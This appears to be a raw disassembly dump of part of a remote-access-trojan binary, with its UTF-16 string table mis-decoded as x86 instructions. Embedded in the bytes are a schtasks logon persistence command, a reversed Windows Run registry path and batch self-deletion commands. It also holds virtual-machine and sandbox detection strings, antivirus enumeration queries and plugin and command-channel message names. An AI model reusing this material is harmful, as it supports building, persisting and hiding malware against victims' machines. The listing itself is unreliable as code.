  40b6fc:	00 43 00             	add    %al,0x0(%ebx)
  40b6ff:	49                   	dec    %ecx
  40b700:	00 49 00             	add    %cl,0x0(%ecx)
  40b703:	77 00                	ja     0x40b705
  40b705:	4e                   	dec    %esi
  40b706:	00 4f 00             	add    %cl,0x0(%edi)
  40b709:	2b 00                	sub    (%eax),%eax
  40b70b:	56                   	push   %esi
  40b70c:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  40b710:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  40b714:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b71a:	09 6e 00             	or     %ebp,0x0(%esi)
  40b71d:	75 00                	jne    0x40b71f
  40b71f:	6c                   	insb   (%dx),%es:(%edi)
  40b720:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b724:	01 00                	add    %eax,(%eax)
  40b726:	03 3a                	add    (%edx),%edi
  40b728:	00 00                	add    %al,(%eax)
  40b72a:	0d 50 00 61 00       	or     $0x610050,%eax
  40b72f:	63 00                	arpl   %eax,(%eax)
  40b731:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b734:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b738:	09 50 00             	or     %edx,0x0(%eax)
  40b73b:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b741:	00 0f                	add    %cl,(%edi)
  40b743:	4d                   	dec    %ebp
  40b744:	00 65 00             	add    %ah,0x0(%ebp)
  40b747:	73 00                	jae    0x40b749
  40b749:	73 00                	jae    0x40b74b
  40b74b:	61                   	popa
  40b74c:	00 67 00             	add    %ah,0x0(%edi)
  40b74f:	65 00 00             	add    %al,%gs:(%eax)
  40b752:	07                   	pop    %es
  40b753:	63 00                	arpl   %eax,(%eax)
  40b755:	6d                   	insl   (%dx),%es:(%edi)
  40b756:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b75a:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b760:	00 73 00             	add    %dh,0x0(%ebx)
  40b763:	63 00                	arpl   %eax,(%eax)
  40b765:	68 00 74 00 61       	push   $0x61007400
  40b76a:	00 73 00             	add    %dh,0x0(%ebx)
  40b76d:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b770:	00 20                	add    %ah,(%eax)
  40b772:	00 2f                	add    %ch,(%edi)
  40b774:	00 63 00             	add    %ah,0x0(%ebx)
  40b777:	72 00                	jb     0x40b779
  40b779:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b77d:	74 00                	je     0x40b77f
  40b77f:	65 00 20             	add    %ah,%gs:(%eax)
  40b782:	00 2f                	add    %ch,(%edi)
  40b784:	00 66 00             	add    %ah,0x0(%esi)
  40b787:	20 00                	and    %al,(%eax)
  40b789:	2f                   	das
  40b78a:	00 73 00             	add    %dh,0x0(%ebx)
  40b78d:	63 00                	arpl   %eax,(%eax)
  40b78f:	20 00                	and    %al,(%eax)
  40b791:	6f                   	outsl  %ds:(%esi),(%dx)
  40b792:	00 6e 00             	add    %ch,0x0(%esi)
  40b795:	6c                   	insb   (%dx),%es:(%edi)
  40b796:	00 6f 00             	add    %ch,0x0(%edi)
  40b799:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b79d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b79e:	00 20                	add    %ah,(%eax)
  40b7a0:	00 2f                	add    %ch,(%edi)
  40b7a2:	00 72 00             	add    %dh,0x0(%edx)
  40b7a5:	6c                   	insb   (%dx),%es:(%edi)
  40b7a6:	00 20                	add    %ah,(%eax)
  40b7a8:	00 68 00             	add    %ch,0x0(%eax)
  40b7ab:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b7b1:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7b5:	74 00                	je     0x40b7b7
  40b7b7:	20 00                	and    %al,(%eax)
  40b7b9:	2f                   	das
  40b7ba:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b7be:	00 20                	add    %ah,(%eax)
  40b7c0:	00 22                	add    %ah,(%edx)
  40b7c2:	00 00                	add    %al,(%eax)
  40b7c4:	11 22                	adc    %esp,(%edx)
  40b7c6:	00 20                	add    %ah,(%eax)
  40b7c8:	00 2f                	add    %ch,(%edi)
  40b7ca:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b7ce:	00 20                	add    %ah,(%eax)
  40b7d0:	00 27                	add    %ah,(%edi)
  40b7d2:	00 22                	add    %ah,(%edx)
  40b7d4:	00 01                	add    %al,(%ecx)
  40b7d6:	13 22                	adc    (%edx),%esp
  40b7d8:	00 27                	add    %ah,(%edi)
  40b7da:	00 20                	add    %ah,(%eax)
  40b7dc:	00 26                	add    %ah,(%esi)
  40b7de:	00 20                	add    %ah,(%eax)
  40b7e0:	00 65 00             	add    %ah,0x0(%ebp)
  40b7e3:	78 00                	js     0x40b7e5
  40b7e5:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b7eb:	5c                   	pop    %esp
  40b7ec:	00 6e 00             	add    %ch,0x0(%esi)
  40b7ef:	75 00                	jne    0x40b7f1
  40b7f1:	52                   	push   %edx
  40b7f2:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b7f6:	00 6f 00             	add    %ch,0x0(%edi)
  40b7f9:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b7ff:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b803:	74 00                	je     0x40b805
  40b805:	6e                   	outsb  %ds:(%esi),(%dx)
  40b806:	00 65 00             	add    %ah,0x0(%ebp)
  40b809:	72 00                	jb     0x40b80b
  40b80b:	72 00                	jb     0x40b80d
  40b80d:	75 00                	jne    0x40b80f
  40b80f:	43                   	inc    %ebx
  40b810:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b814:	00 77 00             	add    %dh,0x0(%edi)
  40b817:	6f                   	outsl  %ds:(%esi),(%dx)
  40b818:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b81c:	00 69 00             	add    %ch,0x0(%ecx)
  40b81f:	57                   	push   %edi
  40b820:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b824:	00 66 00             	add    %ah,0x0(%esi)
  40b827:	6f                   	outsl  %ds:(%esi),(%dx)
  40b828:	00 73 00             	add    %dh,0x0(%ebx)
  40b82b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b82c:	00 72 00             	add    %dh,0x0(%edx)
  40b82f:	63 00                	arpl   %eax,(%eax)
  40b831:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b837:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b83b:	61                   	popa
  40b83c:	00 77 00             	add    %dh,0x0(%edi)
  40b83f:	74 00                	je     0x40b841
  40b841:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b845:	53                   	push   %ebx
  40b846:	00 00                	add    %al,(%eax)
  40b848:	03 22                	add    (%edx),%esp
  40b84a:	00 00                	add    %al,(%eax)
  40b84c:	09 2e                	or     %ebp,(%esi)
  40b84e:	00 62 00             	add    %ah,0x0(%edx)
  40b851:	61                   	popa
  40b852:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b856:	13 40 00             	adc    0x0(%eax),%eax
  40b859:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b85d:	68 00 6f 00 20       	push   $0x20006f00
  40b862:	00 6f 00             	add    %ch,0x0(%edi)
  40b865:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b869:	00 1f                	add    %bl,(%edi)
  40b86b:	74 00                	je     0x40b86d
  40b86d:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b873:	6f                   	outsl  %ds:(%esi),(%dx)
  40b874:	00 75 00             	add    %dh,0x0(%ebp)
  40b877:	74 00                	je     0x40b879
  40b879:	20 00                	and    %al,(%eax)
  40b87b:	33 00                	xor    (%eax),%eax
  40b87d:	20 00                	and    %al,(%eax)
  40b87f:	3e 00 20             	add    %ah,%ds:(%eax)
  40b882:	00 4e 00             	add    %cl,0x0(%esi)
  40b885:	55                   	push   %ebp
  40b886:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b88a:	15 53 00 54 00       	adc    $0x540053,%eax
  40b88f:	41                   	inc    %ecx
  40b890:	00 52 00             	add    %dl,0x0(%edx)
  40b893:	54                   	push   %esp
  40b894:	00 20                	add    %ah,(%eax)
  40b896:	00 22                	add    %ah,(%edx)
  40b898:	00 22                	add    %ah,(%edx)
  40b89a:	00 20                	add    %ah,(%eax)
  40b89c:	00 22                	add    %ah,(%edx)
  40b89e:	00 00                	add    %al,(%eax)
  40b8a0:	07                   	pop    %es
  40b8a1:	43                   	inc    %ebx
  40b8a2:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b8a6:	00 00                	add    %al,(%eax)
  40b8a8:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b8ac:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b8b0:	00 22                	add    %ah,(%edx)
  40b8b2:	00 00                	add    %al,(%eax)
  40b8b4:	0f 22 00             	mov    %eax,%cr0
  40b8b7:	20 00                	and    %al,(%eax)
  40b8b9:	2f                   	das
  40b8ba:	00 66 00             	add    %ah,0x0(%esi)
  40b8bd:	20 00                	and    %al,(%eax)
  40b8bf:	2f                   	das
  40b8c0:	00 71 00             	add    %dh,0x0(%ecx)
  40b8c3:	00 05 78 00 70 00    	add    %al,0x700078
  40b8c9:	00 45 53             	add    %al,0x53(%ebp)
  40b8cc:	00 65 00             	add    %ah,0x0(%ebp)
  40b8cf:	6c                   	insb   (%dx),%es:(%edi)
  40b8d0:	00 65 00             	add    %ah,0x0(%ebp)
  40b8d3:	63 00                	arpl   %eax,(%eax)
  40b8d5:	74 00                	je     0x40b8d7
  40b8d7:	20 00                	and    %al,(%eax)
  40b8d9:	2a 00                	sub    (%eax),%al
  40b8db:	20 00                	and    %al,(%eax)
  40b8dd:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b8e1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8e2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b8e5:	20 00                	and    %al,(%eax)
  40b8e7:	57                   	push   %edi
  40b8e8:	00 69 00             	add    %ch,0x0(%ecx)
  40b8eb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8ec:	00 33                	add    %dh,(%ebx)
  40b8ee:	00 32                	add    %dh,(%edx)
  40b8f0:	00 5f 00             	add    %bl,0x0(%edi)
  40b8f3:	43                   	inc    %ebx
  40b8f4:	00 6f 00             	add    %ch,0x0(%edi)
  40b8f7:	6d                   	insl   (%dx),%es:(%edi)
  40b8f8:	00 70 00             	add    %dh,0x0(%eax)
  40b8fb:	75 00                	jne    0x40b8fd
  40b8fd:	74 00                	je     0x40b8ff
  40b8ff:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b903:	53                   	push   %ebx
  40b904:	00 79 00             	add    %bh,0x0(%ecx)
  40b907:	73 00                	jae    0x40b909
  40b909:	74 00                	je     0x40b90b
  40b90b:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b90f:	00 19                	add    %bl,(%ecx)
  40b911:	4d                   	dec    %ebp
  40b912:	00 61 00             	add    %ah,0x0(%ecx)
  40b915:	6e                   	outsb  %ds:(%esi),(%dx)
  40b916:	00 75 00             	add    %dh,0x0(%ebp)
  40b919:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b91d:	63 00                	arpl   %eax,(%eax)
  40b91f:	74 00                	je     0x40b921
  40b921:	75 00                	jne    0x40b923
  40b923:	72 00                	jb     0x40b925
  40b925:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b929:	00 2b                	add    %ch,(%ebx)
  40b92b:	6d                   	insl   (%dx),%es:(%edi)
  40b92c:	00 69 00             	add    %ch,0x0(%ecx)
  40b92f:	63 00                	arpl   %eax,(%eax)
  40b931:	72 00                	jb     0x40b933
  40b933:	6f                   	outsl  %ds:(%esi),(%dx)
  40b934:	00 73 00             	add    %dh,0x0(%ebx)
  40b937:	6f                   	outsl  %ds:(%esi),(%dx)
  40b938:	00 66 00             	add    %ah,0x0(%esi)
  40b93b:	74 00                	je     0x40b93d
  40b93d:	20 00                	and    %al,(%eax)
  40b93f:	63 00                	arpl   %eax,(%eax)
  40b941:	6f                   	outsl  %ds:(%esi),(%dx)
  40b942:	00 72 00             	add    %dh,0x0(%edx)
  40b945:	70 00                	jo     0x40b947
  40b947:	6f                   	outsl  %ds:(%esi),(%dx)
  40b948:	00 72 00             	add    %dh,0x0(%edx)
  40b94b:	61                   	popa
  40b94c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b950:	00 6f 00             	add    %ch,0x0(%edi)
  40b953:	6e                   	outsb  %ds:(%esi),(%dx)
  40b954:	00 00                	add    %al,(%eax)
  40b956:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b959:	6f                   	outsl  %ds:(%esi),(%dx)
  40b95a:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b95e:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b962:	0f 56 00             	orps   (%eax),%xmm0
  40b965:	49                   	dec    %ecx
  40b966:	00 52 00             	add    %dl,0x0(%edx)
  40b969:	54                   	push   %esp
  40b96a:	00 55 00             	add    %dl,0x0(%ebp)
  40b96d:	41                   	inc    %ecx
  40b96e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b972:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b977:	77 00                	ja     0x40b979
  40b979:	61                   	popa
  40b97a:	00 72 00             	add    %dh,0x0(%edx)
  40b97d:	65 00 00             	add    %al,%gs:(%eax)
  40b980:	15 56 00 69 00       	adc    $0x690056,%eax
  40b985:	72 00                	jb     0x40b987
  40b987:	74 00                	je     0x40b989
  40b989:	75 00                	jne    0x40b98b
  40b98b:	61                   	popa
  40b98c:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b990:	00 6f 00             	add    %ch,0x0(%edi)
  40b993:	78 00                	js     0x40b995
  40b995:	00 17                	add    %dl,(%edi)
  40b997:	53                   	push   %ebx
  40b998:	00 62 00             	add    %ah,0x0(%edx)
  40b99b:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b9a1:	6c                   	insb   (%dx),%es:(%edi)
  40b9a2:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b9a6:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b9aa:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b9ae:	11 45 00             	adc    %eax,0x0(%ebp)
  40b9b1:	72 00                	jb     0x40b9b3
  40b9b3:	72 00                	jb     0x40b9b5
  40b9b5:	20 00                	and    %al,(%eax)
  40b9b7:	48                   	dec    %eax
  40b9b8:	00 57 00             	add    %dl,0x0(%edi)
  40b9bb:	49                   	dec    %ecx
  40b9bc:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9c0:	05 78 00 32 00       	add    $0x320078,%eax
  40b9c5:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b9cb:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b9d1:	74 00                	je     0x40b9d3
  40b9d3:	49                   	dec    %ecx
  40b9d4:	00 6e 00             	add    %ch,0x0(%esi)
  40b9d7:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b9db:	00 09                	add    %cl,(%ecx)
  40b9dd:	48                   	dec    %eax
  40b9de:	00 57 00             	add    %dl,0x0(%edi)
  40b9e1:	49                   	dec    %ecx
  40b9e2:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9e6:	09 55 00             	or     %edx,0x0(%ebp)
  40b9e9:	73 00                	jae    0x40b9eb
  40b9eb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9ef:	00 05 4f 00 53 00    	add    %al,0x53004f
  40b9f5:	00 13                	add    %dl,(%ebx)
  40b9f7:	4d                   	dec    %ebp
  40b9f8:	00 69 00             	add    %ch,0x0(%ecx)
  40b9fb:	63 00                	arpl   %eax,(%eax)
  40b9fd:	72 00                	jb     0x40b9ff
  40b9ff:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba00:	00 73 00             	add    %dh,0x0(%ebx)
  40ba03:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba04:	00 66 00             	add    %ah,0x0(%esi)
  40ba07:	74 00                	je     0x40ba09
  40ba09:	00 03                	add    %al,(%ebx)
  40ba0b:	20 00                	and    %al,(%eax)
  40ba0d:	00 09                	add    %cl,(%ecx)
  40ba0f:	54                   	push   %esp
  40ba10:	00 72 00             	add    %dh,0x0(%edx)
  40ba13:	75 00                	jne    0x40ba15
  40ba15:	65 00 00             	add    %al,%gs:(%eax)
  40ba18:	0b 36                	or     (%esi),%esi
  40ba1a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba1d:	62 00                	bound  %eax,(%eax)
  40ba1f:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40ba25:	46                   	inc    %esi
  40ba26:	00 61 00             	add    %ah,0x0(%ecx)
  40ba29:	6c                   	insb   (%dx),%es:(%edi)
  40ba2a:	00 73 00             	add    %dh,0x0(%ebx)
  40ba2d:	65 00 00             	add    %al,%gs:(%eax)
  40ba30:	0b 33                	or     (%ebx),%esi
  40ba32:	00 32                	add    %dh,(%edx)
  40ba34:	00 62 00             	add    %ah,0x0(%edx)
  40ba37:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ba3d:	50                   	push   %eax
  40ba3e:	00 61 00             	add    %ah,0x0(%ecx)
  40ba41:	74 00                	je     0x40ba43
  40ba43:	68 00 00 0f 56       	push   $0x560f0000
  40ba48:	00 65 00             	add    %ah,0x0(%ebp)
  40ba4b:	72 00                	jb     0x40ba4d
  40ba4d:	73 00                	jae    0x40ba4f
  40ba4f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba55:	00 0b                	add    %cl,(%ebx)
  40ba57:	41                   	inc    %ecx
  40ba58:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ba5c:	00 69 00             	add    %ch,0x0(%ecx)
  40ba5f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba60:	00 00                	add    %al,(%eax)
  40ba62:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba66:	00 75 00             	add    %dh,0x0(%ebp)
  40ba69:	65 00 00             	add    %al,%gs:(%eax)
  40ba6c:	0b 66 00             	or     0x0(%esi),%esp
  40ba6f:	61                   	popa
  40ba70:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ba74:	00 65 00             	add    %ah,0x0(%ebp)
  40ba77:	00 17                	add    %dl,(%edi)
  40ba79:	50                   	push   %eax
  40ba7a:	00 65 00             	add    %ah,0x0(%ebp)
  40ba7d:	72 00                	jb     0x40ba7f
  40ba7f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba83:	72 00                	jb     0x40ba85
  40ba85:	6d                   	insl   (%dx),%es:(%edi)
  40ba86:	00 61 00             	add    %ah,0x0(%ecx)
  40ba89:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba8a:	00 63 00             	add    %ah,0x0(%ebx)
  40ba8d:	65 00 00             	add    %al,%gs:(%eax)
  40ba90:	11 50 00             	adc    %edx,0x0(%eax)
  40ba93:	61                   	popa
  40ba94:	00 73 00             	add    %dh,0x0(%ebx)
  40ba97:	74 00                	je     0x40ba99
  40ba99:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40ba9d:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40baa3:	41                   	inc    %ecx
  40baa4:	00 6e 00             	add    %ch,0x0(%esi)
  40baa7:	74 00                	je     0x40baa9
  40baa9:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40baaf:	72 00                	jb     0x40bab1
  40bab1:	75 00                	jne    0x40bab3
  40bab3:	73 00                	jae    0x40bab5
  40bab5:	00 13                	add    %dl,(%ebx)
  40bab7:	49                   	dec    %ecx
  40bab8:	00 6e 00             	add    %ch,0x0(%esi)
  40babb:	73 00                	jae    0x40babd
  40babd:	74 00                	je     0x40babf
  40babf:	61                   	popa
  40bac0:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bac4:	00 65 00             	add    %ah,0x0(%ebp)
  40bac7:	64 00 00             	add    %al,%fs:(%eax)
  40baca:	09 50 00             	or     %edx,0x0(%eax)
  40bacd:	6f                   	outsl  %ds:(%esi),(%dx)
  40bace:	00 6e 00             	add    %ch,0x0(%esi)
  40bad1:	67 00 00             	add    %al,(%bx,%si)
  40bad4:	0b 47 00             	or     0x0(%edi),%eax
  40bad7:	72 00                	jb     0x40bad9
  40bad9:	6f                   	outsl  %ds:(%esi),(%dx)
  40bada:	00 75 00             	add    %dh,0x0(%ebp)
  40badd:	70 00                	jo     0x40badf
  40badf:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bae5:	00 2b                	add    %ch,(%ebx)
  40bae7:	5c                   	pop    %esp
  40bae8:	00 72 00             	add    %dh,0x0(%edx)
  40baeb:	6f                   	outsl  %ds:(%esi),(%dx)
  40baec:	00 6f 00             	add    %ch,0x0(%edi)
  40baef:	74 00                	je     0x40baf1
  40baf1:	5c                   	pop    %esp
  40baf2:	00 53 00             	add    %dl,0x0(%ebx)
  40baf5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40baf9:	75 00                	jne    0x40bafb
  40bafb:	72 00                	jb     0x40bafd
  40bafd:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bb03:	43                   	inc    %ebx
  40bb04:	00 65 00             	add    %ah,0x0(%ebp)
  40bb07:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb08:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bb0c:	00 72 00             	add    %dh,0x0(%edx)
  40bb0f:	32 00                	xor    (%eax),%al
  40bb11:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bb17:	6c                   	insb   (%dx),%es:(%edi)
  40bb18:	00 65 00             	add    %ah,0x0(%ebp)
  40bb1b:	63 00                	arpl   %eax,(%eax)
  40bb1d:	74 00                	je     0x40bb1f
  40bb1f:	20 00                	and    %al,(%eax)
  40bb21:	2a 00                	sub    (%eax),%al
  40bb23:	20 00                	and    %al,(%eax)
  40bb25:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bb29:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb2a:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb2d:	20 00                	and    %al,(%eax)
  40bb2f:	41                   	inc    %ecx
  40bb30:	00 6e 00             	add    %ch,0x0(%esi)
  40bb33:	74 00                	je     0x40bb35
  40bb35:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb3b:	72 00                	jb     0x40bb3d
  40bb3d:	75 00                	jne    0x40bb3f
  40bb3f:	73 00                	jae    0x40bb41
  40bb41:	50                   	push   %eax
  40bb42:	00 72 00             	add    %dh,0x0(%edx)
  40bb45:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb46:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bb4a:	00 63 00             	add    %ah,0x0(%ebx)
  40bb4d:	74 00                	je     0x40bb4f
  40bb4f:	00 17                	add    %dl,(%edi)
  40bb51:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bb55:	73 00                	jae    0x40bb57
  40bb57:	70 00                	jo     0x40bb59
  40bb59:	6c                   	insb   (%dx),%es:(%edi)
  40bb5a:	00 61 00             	add    %ah,0x0(%ecx)
  40bb5d:	79 00                	jns    0x40bb5f
  40bb5f:	4e                   	dec    %esi
  40bb60:	00 61 00             	add    %ah,0x0(%ecx)
  40bb63:	6d                   	insl   (%dx),%es:(%edi)
  40bb64:	00 65 00             	add    %ah,0x0(%ebp)
  40bb67:	00 07                	add    %al,(%edi)
  40bb69:	4e                   	dec    %esi
  40bb6a:	00 2f                	add    %ch,(%edi)
  40bb6c:	00 41 00             	add    %al,0x0(%ecx)
  40bb6f:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bb75:	00 13                	add    %dl,(%ebx)
  40bb77:	53                   	push   %ebx
  40bb78:	00 6f 00             	add    %ch,0x0(%edi)
  40bb7b:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bb80:	00 61 00             	add    %ah,0x0(%ecx)
  40bb83:	72 00                	jb     0x40bb85
  40bb85:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bb8a:	09 70 00             	or     %esi,0x0(%eax)
  40bb8d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb8e:	00 6e 00             	add    %ch,0x0(%esi)
  40bb91:	67 00 00             	add    %al,(%bx,%si)
  40bb94:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bb99:	75 00                	jne    0x40bb9b
  40bb9b:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bb9f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bba0:	00 00                	add    %al,(%eax)
  40bba2:	15 73 00 61 00       	adc    $0x610073,%eax
  40bba7:	76 00                	jbe    0x40bba9
  40bba9:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bbad:	6c                   	insb   (%dx),%es:(%edi)
  40bbae:	00 75 00             	add    %dh,0x0(%ebp)
  40bbb1:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbb5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbb6:	00 00                	add    %al,(%eax)
  40bbb8:	07                   	pop    %es
  40bbb9:	44                   	inc    %esp
  40bbba:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bbbe:	00 00                	add    %al,(%eax)
  40bbc0:	15 73 00 65 00       	adc    $0x650073,%eax
  40bbc5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbc6:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bbca:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbce:	00 67 00             	add    %ah,0x0(%edi)
  40bbd1:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bbd7:	48                   	dec    %eax
  40bbd8:	00 61 00             	add    %ah,0x0(%ecx)
  40bbdb:	73 00                	jae    0x40bbdd
  40bbdd:	68 00 65 00 73       	push   $0x73006500
  40bbe2:	00 00                	add    %al,(%eax)
  40bbe4:	09 48 00             	or     %ecx,0x0(%eax)
  40bbe7:	61                   	popa
  40bbe8:	00 73 00             	add    %dh,0x0(%ebx)
  40bbeb:	68 00 00 1b 50       	push   $0x501b0000
  40bbf0:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbf4:	00 67 00             	add    %ah,0x0(%edi)
  40bbf7:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bbfd:	50                   	push   %eax
  40bbfe:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc02:	00 67 00             	add    %ah,0x0(%edi)
  40bc05:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bc0b:	52                   	push   %edx
  40bc0c:	00 75 00             	add    %dh,0x0(%ebp)
  40bc0f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc10:	00 00                	add    %al,(%eax)
  40bc12:	0f 4d 00             	cmovge (%eax),%eax
  40bc15:	73 00                	jae    0x40bc17
  40bc17:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bc1b:	61                   	popa
  40bc1c:	00 63 00             	add    %ah,0x0(%ebx)
  40bc1f:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bc22:	11 52 00             	adc    %edx,0x0(%edx)
  40bc25:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bc29:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bc2d:	76 00                	jbe    0x40bc2f
  40bc2f:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bc34:	0b 45 00             	or     0x0(%ebp),%eax
  40bc37:	72 00                	jb     0x40bc39
  40bc39:	72 00                	jb     0x40bc3b
  40bc3b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc3c:	00 72 00             	add    %dh,0x0(%edx)
  40bc3f:	00 47 6d             	add    %al,0x6d(%edi)
  40bc42:	00 61 00             	add    %ah,0x0(%ecx)
  40bc45:	73 00                	jae    0x40bc47
  40bc47:	74 00                	je     0x40bc49
  40bc49:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc4d:	4b                   	dec    %ebx
  40bc4e:	00 65 00             	add    %ah,0x0(%ebp)
  40bc51:	79 00                	jns    0x40bc53
  40bc53:	20 00                	and    %al,(%eax)
  40bc55:	63 00                	arpl   %eax,(%eax)
  40bc57:	61                   	popa
  40bc58:	00 6e 00             	add    %ch,0x0(%esi)
  40bc5b:	20 00                	and    %al,(%eax)
  40bc5d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc5e:	00 6f 00             	add    %ch,0x0(%edi)
  40bc61:	74 00                	je     0x40bc63
  40bc63:	20 00                	and    %al,(%eax)
  40bc65:	62 00                	bound  %eax,(%eax)
  40bc67:	65 00 20             	add    %ah,%gs:(%eax)
  40bc6a:	00 6e 00             	add    %ch,0x0(%esi)
  40bc6d:	75 00                	jne    0x40bc6f
  40bc6f:	6c                   	insb   (%dx),%es:(%edi)
  40bc70:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
